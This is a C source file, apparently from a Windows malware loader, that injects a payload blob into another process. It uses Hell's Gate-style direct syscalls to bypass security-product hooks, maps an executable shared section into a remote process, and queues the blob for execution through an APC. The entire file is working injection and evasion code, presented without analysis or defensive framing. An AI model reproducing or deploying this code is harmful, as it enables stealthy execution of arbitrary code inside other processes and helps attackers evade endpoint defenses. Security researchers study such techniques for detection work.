#include "common.h"

// Procedures from HellsGate.asm
extern VOID	HellsGate(
	IN WORD wSyscallNumber,			// syscall number
	IN PVOID pSyscallInstAddress	// memory address of the `syscall` instruction
);
extern HellDescent();

BOOL CopyBlob(
	IN	PSYSCALL_TABLE	pSyscallTable,
	IN	HANDLE			hProcess,
	IN	PBYTE			pBlob,
	IN	SIZE_T			sBlobSize,
	OUT	PBYTE* ppBlobAddress
) {
	BOOL		bSTATE = TRUE;
	HANDLE		hSection = NULL;
	PVOID		pMapLocalAddress = NULL,
		pMapRemoteAddress = NULL;
	NTSTATUS	STATUS = 0;

	SIZE_T			sViewSize = NULL;
	LARGE_INTEGER	MaximumSize = {
		.HighPart = 0,
		.LowPart = sBlobSize
	};


	HellsGate(pSyscallTable->NtCreateSection.dwSSn, pSyscallTable->NtCreateSection.pSyscallInstAddress);
	if ((STATUS = HellDescent(&hSection, SECTION_RWX, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		DEBUG_PRINT("NtCreateSection failed with error: 0x%0.8X\n", STATUS);
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	HellsGate(pSyscallTable->NtMapViewOfSection.dwSSn, pSyscallTable->NtMapViewOfSection.pSyscallInstAddress);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &pMapLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		DEBUG_PRINT("NtMapViewOfSection failed with error: 0x%0.8X\n", STATUS);
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	memcpy(pMapLocalAddress, pBlob, sBlobSize);

	HellsGate(pSyscallTable->NtMapViewOfSection.dwSSn, pSyscallTable->NtMapViewOfSection.pSyscallInstAddress);
	if ((STATUS = HellDescent(hSection, hProcess, &pMapRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READ)) != 0) {
		DEBUG_PRINT("NtMapViewOfSection failed with error: 0x%0.8X\n", STATUS);
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

	*ppBlobAddress = pMapRemoteAddress;

_EndOfFunction:
	if (hSection) {
		HellsGate(pSyscallTable->NtClose.dwSSn, pSyscallTable->NtClose.pSyscallInstAddress);
		if ((STATUS = HellDescent(hSection)) != 0) {
			DEBUG_PRINT("NtMapViewOfSection failed with error: 0x%0.8X\n", STATUS);
			bSTATE = FALSE;
		}
	}

	return bSTATE;
}

BOOL ScheduleRun(
	IN	PSYSCALL_TABLE	pSyscallTable,
	IN	HANDLE			hThread,
	IN	PBYTE			pBlobAddress
) {

	NTSTATUS STATUS = 0;

	HellsGate(pSyscallTable->NtQueueApcThread.dwSSn, pSyscallTable->NtQueueApcThread.pSyscallInstAddress);
	if ((STATUS = HellDescent(hThread, pBlobAddress, NULL, NULL, NULL)) != 0) {
		DEBUG_PRINT("NtQueueApcThread failed with error: %lu\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}